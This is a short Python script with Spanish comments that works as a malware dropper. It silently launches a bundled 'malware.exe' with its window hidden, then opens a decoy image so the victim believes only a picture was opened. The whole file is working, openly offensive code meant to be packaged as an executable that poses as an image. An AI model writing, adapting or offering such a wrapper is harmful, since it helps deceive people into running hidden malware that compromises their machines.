import os
import sys
import tempfile
import subprocess
import base64
import ctypes
import time

def main():
    """Wrapper que ejecuta malware.exe y muestra una imagen"""
    try:
        # Obtener ruta del ejecutable actual
        if getattr(sys, 'frozen', False):
            # Si estamos en un .exe compilado
            current_dir = os.path.dirname(sys.executable)
        else:
            current_dir = os.path.dirname(os.path.abspath(__file__))
        
        # Ruta al malware real (debe estar en la misma carpeta)
        malware_path = os.path.join(current_dir, "malware.exe")
        imagen_path = os.path.join(current_dir, "imagen_real.png")
        
        # Verificar que existe el malware
        if os.path.exists(malware_path):
            # Ejecutar malware en segundo plano (sin consola visible)
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            
            subprocess.Popen(
                [malware_path],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            print("Malware ejecutado (oculto)")
            
        # Mostrar imagen real para disimular
        if os.path.exists(imagen_path):
            os.startfile(imagen_path)
            print("Imagen mostrada")
            
        # Esperar un poco y cerrar
        time.sleep(2)
        
    except Exception as e:
        print(f"Error: {e}")
        input("Presiona Enter para salir...")

if __name__ == "__main__":
    main()